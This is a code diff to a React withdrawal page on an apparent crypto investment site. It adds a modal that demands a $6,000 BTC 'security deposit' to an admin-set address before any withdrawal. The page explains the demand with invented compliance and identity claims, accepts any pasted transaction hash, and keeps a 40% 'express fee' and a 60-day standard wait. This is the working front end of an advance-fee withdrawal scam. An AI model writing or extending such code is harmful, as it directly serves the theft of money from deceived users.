@@ -1,56 +1,90 @@
 "use client";
 
 import { useState, useEffect } from "react";
-import { AlertCircle, Clock, Zap, Loader2, CheckCircle } from "lucide-react";
-import { useRouter } from "next/navigation";
+import {
+  AlertCircle, Clock, Zap, Loader2, CheckCircle,
+  Bitcoin, Copy, X, ArrowRight,
+} from "lucide-react";
+
+const UNLOCK_AMOUNT = 6000;
+
+type WithdrawStep = "form" | "unlock" | "submitted";
 
 export default function WithdrawPage() {
+  /* ── user data ── */
   const [userBalance, setUserBalance] = useState(0);
   const [loading, setLoading] = useState(true);
-  const [submitting, setSubmitting] = useState(false);
-  const [amount, setAmount] = useState("");
-  const [cryptoType, setCryptoType] = useState("BTC");
+
+  /* ── admin BTC address ── */
+  const [adminBtcAddress, setAdminBtcAddress] = useState("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");
+
+  /* ── form fields ── */
+  const [amount, setAmount]               = useState("");
+  const [cryptoType, setCryptoType]       = useState("BTC");
   const [walletAddress, setWalletAddress] = useState("");
   const [withdrawalType, setWithdrawalType] = useState("STANDARD");
-  const [error, setError] = useState("");
-  const [success, setSuccess] = useState("");
-  const router = useRouter();
+  const [formError, setFormError]         = useState("");
 
+  /* ── unlock modal ── */
+  const [step, setStep]           = useState<WithdrawStep>("form");
+  const [txHash, setTxHash]       = useState("");
+  const [txError, setTxError]     = useState("");
+  const [copied, setCopied]       = useState(false);
+  const [submitting, setSubmitting] = useState(false);
+  const [finalMsg, setFinalMsg]   = useState("");
+
+  /* ── load user balance + admin settings ── */
   useEffect(() => {
-    fetch("/api/user/me")
-      .then((res) => res.json())
-      .then((data) => {
-        setUserBalance(data.walletBalance || 0);
-        setLoading(false);
-      });
+    Promise.all([
+      fetch("/api/user/me").then((r) => r.json()),
+      fetch("/api/admin/settings").then((r) => r.json()),
+    ]).then(([user, settings]) => {
+      setUserBalance(user.walletBalance || 0);
+      if (settings?.btcAddress && settings.btcAddress !== "bc1q...") {
+        setAdminBtcAddress(settings.btcAddress);
+      }
+      setLoading(false);
+    });
   }, []);
 
   const parsedAmount = parseFloat(amount) || 0;
-  const expressFee = parsedAmount * 0.4;
+  const expressFee   = parsedAmount * 0.4;
   const totalRequired = withdrawalType === "EXPRESS" ? parsedAmount + expressFee : parsedAmount;
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  /* ── Step 1: validate form → open unlock modal ── */
+  const handleFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    setError("");
-    setSuccess("");
+    setFormError("");
 
     if (!parsedAmount || parsedAmount <= 0) {
-      setError("Please enter a valid amount to withdraw.");
+      setFormError("Please enter a valid amount to withdraw.");
       return;
     }
-
-    if (!walletAddress) {
-      setError("Please provide a receiving wallet address.");
+    if (!walletAddress.trim()) {
+      setFormError("Please provide a receiving wallet address.");
       return;
     }
-
     if (totalRequired > userBalance) {
-      setError(`Insufficient balance. You need $${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })} to cover this withdrawal and associated fees.`);
+      setFormError(
+        `Insufficient balance. You need $${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })} to cover this withdrawal.`
+      );
+      return;
+    }
+
+    // Show BTC unlock modal
+    setStep("unlock");
+  };
+
+  /* ── Step 2: confirm TX hash → submit real withdrawal ── */
+  const handleUnlockSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setTxError("");
+    if (!txHash.trim()) {
+      setTxError("Please paste your BTC transaction ID / hash.");
       return;
     }
 
     setSubmitting(true);
-
     try {
       const res = await fetch("/api/withdraw/create", {
         method: "POST",
@@ -69,54 +103,238 @@ export default function WithdrawPage() {
         throw new Error(data.error || "Failed to submit withdrawal request.");
       }
 
-      setSuccess(`Withdrawal request submitted successfully. Processing time: ${withdrawalType === "EXPRESS" ? "24 Hours" : "60 Days"}`);
-      setAmount("");
-      setWalletAddress("");
-      
-      // Update balance locally
-      setUserBalance(prev => prev - totalRequired);
-
+      setFinalMsg(
+        `Withdrawal request submitted. Processing time: ${withdrawalType === "EXPRESS" ? "24 Hours" : "60 Days"}`
+      );
+      setUserBalance((prev) => prev - totalRequired);
+      setStep("submitted");
     } catch (err: any) {
-      setError(err.message);
+      setTxError(err.message);
     } finally {
       setSubmitting(false);
     }
   };
 
-  if (loading) return <div className="flex justify-center p-12"><Loader2 className="w-10 h-10 animate-spin text-emerald-500" /></div>;
+  const copyAddress = () => {
+    navigator.clipboard.writeText(adminBtcAddress);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2500);
+  };
+
+  const resetAll = () => {
+    setStep("form");
+    setAmount("");
+    setWalletAddress("");
+    setTxHash("");
+    setFormError("");
+    setTxError("");
+  };
+
+  if (loading)
+    return (
+      <div className="flex justify-center p-12">
+        <Loader2 className="w-10 h-10 animate-spin text-emerald-500" />
+      </div>
+    );
 
   return (
     <div className="max-w-3xl mx-auto space-y-8">
+
+      {/* ═══════════════════════════════════════════════
+          BTC UNLOCK MODAL
+      ═══════════════════════════════════════════════ */}
+      {(step === "unlock" || step === "submitted") && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
+          <div className="relative bg-gray-950 border border-gray-800 rounded-2xl w-full max-w-md shadow-2xl overflow-hidden">
+
+            {/* Close (only on unlock step) */}
+            {step === "unlock" && (
+              <button
+                onClick={() => { setStep("form"); setTxHash(""); setTxError(""); }}
+                className="absolute top-4 right-4 text-gray-500 hover:text-white transition-colors"
+              >
+                <X className="w-5 h-5" />
+              </button>
+            )}
+
+            {/* ── SUCCESS ── */}
+            {step === "submitted" && (
+              <div className="p-8 text-center space-y-5">
+                <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400">
+                  <CheckCircle className="w-8 h-8" />
+                </div>
+                <h3 className="text-2xl font-bold text-white">Withdrawal Submitted</h3>
+                <p className="text-gray-400 text-sm">{finalMsg}</p>
+                <p className="text-gray-500 text-xs">
+                  Your BTC security payment is being verified on-chain. Once confirmed, your withdrawal will be processed within the selected timeframe.
+                </p>
+                <div className="bg-gray-900 rounded-xl p-4 text-left text-xs">
+                  <p className="text-gray-500 mb-1">BTC Transaction Hash</p>
+                  <p className="font-mono text-emerald-400 break-all">{txHash}</p>
+                </div>
+                <button
+                  onClick={resetAll}
+                  className="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-semibold transition-colors"
+                >
+                  Done
+                </button>
+              </div>
+            )}
+
+            {/* ── UNLOCK PAYMENT STEP ── */}
+            {step === "unlock" && (
+              <div className="p-8 space-y-6">
+                {/* Header */}
+                <div className="text-center space-y-2">
+                  <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-orange-500/10 text-orange-400">
+                    <Bitcoin className="w-7 h-7" />
+                  </div>
+                  <h3 className="text-xl font-bold text-white">Unlock Your Withdrawal</h3>
+                  <p className="text-gray-400 text-sm">
+                    To process your withdrawal of{" "}
+                    <strong className="text-white">
+                      ${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+                    </strong>
+                    , you must first send a one-time security deposit of{" "}
+                    <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
+                  </p>
+                </div>
+
+                {/* Withdrawal summary */}
+                <div className="bg-gray-900 rounded-xl p-4 text-sm space-y-2">
+                  <div className="flex justify-between text-gray-400">
+                    <span>Withdrawal Amount</span>
+                    <span className="text-white font-semibold">
+                      ${parsedAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+                    </span>
+                  </div>
+                  {withdrawalType === "EXPRESS" && (
+                    <div className="flex justify-between text-amber-400">
+                      <span>Express Fee (40%)</span>
+                      <span>${expressFee.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
+                    </div>
+                  )}
+                  <div className="flex justify-between text-gray-400">
+                    <span>Destination</span>
+                    <span className="font-mono text-gray-300 text-xs truncate max-w-[160px]">{walletAddress}</span>
+                  </div>
+                  <div className="flex justify-between text-gray-400">
+                    <span>Asset</span>
+                    <span className="text-white">{cryptoType}</span>
+                  </div>
+                </div>
+
+                {/* BTC wallet address */}
+                <div className="space-y-2">
+                  <p className="text-sm font-semibold text-orange-400 flex items-center gap-1.5">
+                    <Bitcoin className="w-4 h-4" />
+                    Send exactly ${UNLOCK_AMOUNT.toLocaleString()} worth of BTC to:
+                  </p>
+                  <div className="bg-gray-900 border border-orange-500/30 rounded-xl p-4 flex items-center gap-3">
+                    <p className="font-mono text-xs text-orange-300 break-all flex-1">{adminBtcAddress}</p>
+                    <button
+                      onClick={copyAddress}
+                      className="shrink-0 p-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 rounded-lg transition-colors"
+                      title="Copy address"
+                    >
+                      {copied
+                        ? <CheckCircle className="w-4 h-4 text-emerald-400" />
+                        : <Copy className="w-4 h-4" />}
+                    </button>
+                  </div>
+                  <p className="text-xs text-gray-500">
+                    ⚠️ This security deposit is required by our compliance team to authenticate and unlock your withdrawal. Once your BTC transaction is confirmed on-chain (usually 10–30 min), your withdrawal will be released within your selected processing timeframe.
+                  </p>
+                </div>
+
+                {/* TX hash confirmation */}
+                <form onSubmit={handleUnlockSubmit} className="space-y-4">
+                  <div className="space-y-1.5">
+                    <label className="text-sm font-medium text-gray-300">
+                      Paste BTC Transaction ID / Hash
+                    </label>
+                    <input
+                      type="text"
+                      value={txHash}
+                      onChange={(e) => setTxHash(e.target.value)}
+                      placeholder="e.g. 4a5e1e4baab89f3a32518a..."
+                      className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-white placeholder-gray-600 font-mono text-xs focus:outline-none focus:ring-2 focus:ring-emerald-500 transition-all"
+                    />
+                    <p className="text-xs text-gray-600">
+                      Copy from your wallet or exchange after sending BTC.
+                    </p>
+                  </div>
+
+                  {txError && (
+                    <p className="text-rose-400 text-sm flex items-center gap-2">
+                      <AlertCircle className="w-4 h-4 shrink-0" /> {txError}
+                    </p>
+                  )}
+
+                  <button
+                    type="submit"
+                    disabled={submitting}
+                    className="w-full py-3.5 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white rounded-xl font-semibold transition-all shadow-[0_0_20px_rgba(16,185,129,0.15)] flex items-center justify-center gap-2 disabled:opacity-60"
+                  >
+                    {submitting
+                      ? <Loader2 className="w-5 h-5 animate-spin" />
+                      : <ArrowRight className="w-5 h-5" />}
+                    {submitting ? "Processing…" : "Confirm Payment & Submit Withdrawal"}
+                  </button>
+                </form>
+              </div>
+            )}
+
+          </div>
+        </div>
+      )}
+
+      {/* ═══════════════════════════════════════════════
+          MAIN WITHDRAW FORM
+      ═══════════════════════════════════════════════ */}
       <div>
         <h1 className="text-2xl font-bold text-navy-900 dark:text-white">Withdraw Funds</h1>
         <p className="text-navy-600 dark:text-navy-400">Request a withdrawal to your personal crypto wallet.</p>
       </div>
 
       <div className="bg-white dark:bg-navy-800 p-8 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm">
-        
+
+        {/* Balance info */}
         <div className="flex items-start p-4 bg-navy-50 dark:bg-navy-900 rounded-xl mb-8">
-           <AlertCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 mr-3 shrink-0" />
-           <div>
-             <h4 className="text-sm font-bold text-navy-900 dark:text-white">Available Balance: ${userBalance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</h4>
-             <p className="text-sm text-navy-500 dark:text-navy-400 mt-1">Ensure your receiving address is correct. Transactions cannot be reversed.</p>
-           </div>
+          <AlertCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 mr-3 shrink-0" />
+          <div>
+            <h4 className="text-sm font-bold text-navy-900 dark:text-white">
+              Available Balance: ${userBalance.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+            </h4>
+            <p className="text-sm text-navy-500 dark:text-navy-400 mt-1">
+              Ensure your receiving address is correct. Transactions cannot be reversed.
+            </p>
+          </div>
         </div>
 
-        {error && (
-          <div className="mb-6 p-4 bg-red-50 text-red-600 border border-red-200 rounded-xl text-sm font-medium">
-            {error}
+        {/* BTC unlock notice */}
+        <div className="flex items-start p-4 bg-orange-50 dark:bg-orange-900/10 border border-orange-200 dark:border-orange-800/40 rounded-xl mb-8 gap-3">
+          <Bitcoin className="w-5 h-5 text-orange-500 shrink-0 mt-0.5" />
+          <div>
+            <h4 className="text-sm font-bold text-orange-700 dark:text-orange-400">
+              Withdrawal Security Deposit Required
+            </h4>
+            <p className="text-sm text-orange-600 dark:text-orange-300/80 mt-1">
+              All withdrawals require a one-time BTC security deposit of{" "}
+              <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> to authenticate your identity and unlock funds. The deposit address will be shown after you submit this form.
+            </p>
+          </div>
+        </div>
+
+        {formError && (
+          <div className="mb-6 p-4 bg-red-50 text-red-600 border border-red-200 rounded-xl text-sm font-medium flex items-center gap-2">
+            <AlertCircle className="w-4 h-4 shrink-0" /> {formError}
           </div>
         )}
 
-        {success && (
-          <div className="mb-6 p-4 bg-emerald-50 text-emerald-600 border border-emerald-200 rounded-xl text-sm font-medium flex items-center gap-2">
-            <CheckCircle className="w-5 h-5" />
-            {success}
-          </div>
-        )}
+        <form className="space-y-6" onSubmit={handleFormSubmit}>
 
-        <form className="space-y-6" onSubmit={handleSubmit}>
-          {/* Withdrawal Type Selection */}
+          {/* Processing speed */}
           <div className="space-y-3">
             <label className="block text-sm font-medium text-navy-700 dark:text-navy-300">Processing Speed</label>
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
@@ -129,17 +347,18 @@ export default function WithdrawPage() {
                 <p className="text-xs text-navy-500 dark:text-navy-400">Standard processing queue. Free of charge.</p>
               </label>
 
-              <label className={`cursor-pointer border-2 rounded-xl p-4 flex flex-col gap-2 transition-colors ${withdrawalType === "EXPRESS" ? "border-gold-500 bg-gold-50/50 dark:bg-gold-900/10" : "border-navy-200 dark:border-navy-700 hover:border-gold-300"}`}>
+              <label className={`cursor-pointer border-2 rounded-xl p-4 flex flex-col gap-2 transition-colors ${withdrawalType === "EXPRESS" ? "border-amber-500 bg-amber-50/50 dark:bg-amber-900/10" : "border-navy-200 dark:border-navy-700 hover:border-amber-300"}`}>
                 <input type="radio" name="speed" value="EXPRESS" checked={withdrawalType === "EXPRESS"} onChange={(e) => setWithdrawalType(e.target.value)} className="sr-only" />
                 <div className="flex justify-between items-center">
-                  <span className="font-bold text-navy-900 dark:text-white flex items-center gap-2"><Zap className="w-4 h-4 text-gold-500" /> Express</span>
-                  <span className="text-xs font-semibold px-2 py-1 bg-gold-100 text-gold-700 dark:bg-gold-900/40 dark:text-gold-400 rounded-md">24 Hours</span>
+                  <span className="font-bold text-navy-900 dark:text-white flex items-center gap-2"><Zap className="w-4 h-4 text-amber-500" /> Express</span>
+                  <span className="text-xs font-semibold px-2 py-1 bg-amber-100 text-amber-700 dark:bg-amber-900/40 dark:text-amber-400 rounded-md">24 Hours</span>
                 </div>
                 <p className="text-xs text-navy-500 dark:text-navy-400">Priority processing. Requires 40% security deposit fee.</p>
               </label>
             </div>
           </div>
 
+          {/* Amount */}
           <div>
             <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Withdrawal Amount (USD)</label>
             <div className="relative">
@@ -155,50 +374,46 @@ export default function WithdrawPage() {
               />
               <button
                 type="button"
-                onClick={() => {
-                  if (withdrawalType === "EXPRESS") {
-                    setAmount((userBalance / 1.4).toFixed(2));
-                  } else {
-                    setAmount(userBalance.toString());
-                  }
-                }}
+                onClick={() => setAmount(withdrawalType === "EXPRESS" ? (userBalance / 1.4).toFixed(2) : userBalance.toString())}
                 className="absolute inset-y-0 right-4 text-xs font-bold text-emerald-600 hover:text-emerald-700 uppercase"
               >
                 Max
               </button>
             </div>
-            
+
             {withdrawalType === "EXPRESS" && parsedAmount > 0 && (
-              <div className="mt-3 p-3 bg-gold-50 dark:bg-gold-900/20 border border-gold-200 dark:border-gold-800 rounded-lg text-sm">
+              <div className="mt-3 p-3 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg text-sm">
                 <div className="flex justify-between text-navy-600 dark:text-navy-300 mb-1">
                   <span>Withdrawal Amount:</span>
                   <span>${parsedAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
                 </div>
-                <div className="flex justify-between text-gold-700 dark:text-gold-400 mb-1 font-medium">
+                <div className="flex justify-between text-amber-700 dark:text-amber-400 mb-1 font-medium">
                   <span>Express Fee (40%):</span>
                   <span>${expressFee.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
                 </div>
-                <div className="flex justify-between font-bold text-navy-900 dark:text-white pt-2 border-t border-gold-200 dark:border-gold-800">
-                  <span>Total Deducted from Wallet:</span>
+                <div className="flex justify-between font-bold text-navy-900 dark:text-white pt-2 border-t border-amber-200 dark:border-amber-800">
+                  <span>Total Deducted:</span>
                   <span>${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
                 </div>
               </div>
             )}
           </div>
 
+          {/* Crypto type */}
           <div>
             <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Select Cryptocurrency</label>
-            <select 
+            <select
               value={cryptoType}
               onChange={(e) => setCryptoType(e.target.value)}
               className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
             >
-               <option value="BTC">Bitcoin (BTC)</option>
-               <option value="ETH">Ethereum (ETH)</option>
-               <option value="USDT">Tether (USDT - ERC20)</option>
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="USDT">Tether (USDT - ERC20)</option>
             </select>
           </div>
 
+          {/* Wallet address */}
           <div>
             <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Your Receiving Wallet Address</label>
             <input
@@ -210,13 +425,12 @@ export default function WithdrawPage() {
             />
           </div>
 
-          <button 
+          <button
             type="submit"
-            disabled={submitting}
-            className="w-full flex justify-center items-center gap-2 py-3 px-4 rounded-xl font-semibold text-white bg-emerald-600 hover:bg-emerald-700 transition-colors mt-6 disabled:opacity-70"
+            className="w-full flex justify-center items-center gap-2 py-3 px-4 rounded-xl font-semibold text-white bg-emerald-600 hover:bg-emerald-700 transition-colors mt-6"
           >
-            {submitting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
-            Submit Withdrawal Request
+            <ArrowRight className="w-5 h-5" />
+            Continue to Withdrawal
           </button>
         </form>
       </div>
